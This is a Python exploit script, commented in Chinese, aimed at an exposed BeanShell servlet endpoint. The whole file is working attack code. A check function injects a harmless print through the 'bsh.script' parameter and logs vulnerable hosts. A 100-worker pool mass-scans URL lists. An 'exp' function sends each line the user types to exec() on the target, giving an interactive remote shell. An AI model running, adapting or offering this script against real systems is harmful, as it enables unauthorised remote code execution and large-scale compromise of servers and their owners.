import requests,re,os,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""test"""
    print(test)

def poc(target):
    api = "/servlet/~ic/bsh.servlet.BshServlet"
    headers = {
        "Content-Length":"50",
        "Cache-Control":"max - age = 0",
        "Upgrade-Insecure-Requests":"1",
        "Origin":"http:// 36.137.72.94:2224",
        "Content-Type":"application/x-www-form-urlencoded",
        "Connection":"close"
    }
    data = {
        'bsh.script':'print("i")'
    }
    try:
        res1 = requests.get(url=target+api,timeout=5,headers=headers,verify=False)
        if res1.status_code==200:
            res2 = requests.post(url=target+api,timeout=5,data=data,headers=headers,verify=False)
            content = re.findall(r'<pre>(.*?)</pre>',res2.text,re.S)
            if 'i' in content[0]:
                print(f"[+]{target}存在漏洞")
                with open ("yy_result.txt","a",encoding="utf-8") as f:
                    f.write(f"{target}存在漏洞\n")
                    return  True
            else:
                print(f"[-]不存在漏洞")
    except Exception as e:
        print(f"{target}可能存在问题，请手工测试")
def exp(target):
    os.system("cls")
    print("正在努力获取shell")
    api = "/servlet/~ic/bsh.servlet.BshServlet"
    headers = {
        "Content-Length": "50",
        "Cache-Control": "max - age = 0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http:// 36.137.72.94:2224",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    # data = {
    #     'bsh.script': 'print("i")'
    # }
    while True:
        cmd = input(">")
        if cmd == "exit":
            exit()
        data = 'bsh.script=exec("' + cmd + '");\r\n'
        res1 = requests.post(url=target+api,timeout=5,headers=headers,data=data,verify=False)
        content = re.findall(r'<pre>(.*?)</pre>',res1.text,re.S)
        print(content[0].strip())

def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    url_list = []
    if args.url and not args.file:
        poc(args.url)
        exp(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
    mp = Pool(100)
    mp.map(poc,url_list)
    mp.close()
    mp.join()


if __name__ == '__main__':
    main()